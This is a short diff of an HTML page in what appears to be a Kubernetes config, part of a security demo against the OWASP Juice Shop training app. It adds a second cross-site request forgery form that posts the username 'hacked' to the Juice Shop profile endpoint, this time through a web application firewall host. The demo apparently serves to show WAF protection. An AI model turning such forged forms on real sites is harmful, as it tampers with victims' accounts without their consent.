@@ -79,7 +79,7 @@ data:
     
     <p></p>
     <hr>
-    <h3>Hacking Form</h3>
+    <h3>Hacking Form - direct Juiceshop</h3>
     Submit form to hack "username" in Juiceshop
     <form id="hackingform" 
           action="JUICESHOP_HOST/profile" 
@@ -87,5 +87,15 @@ data:
      Username:<input name="username" type="text" value="hacked" />
      <input type="submit" value="Hack Username" />
     </form>
-    </script>
+
+    <hr>
+    <h3>Hacking Form - over Core-WAAP</h3>
+    Submit form to hack "username" in Juiceshop
+    <form id="hackingform" 
+          action="JUICESHOP_HOST2/profile" 
+         method="POST">
+     Username:<input name="username" type="text" value="hacked" />
+     <input type="submit" value="Hack Username" />
+    </form>
+    
     </body></html>
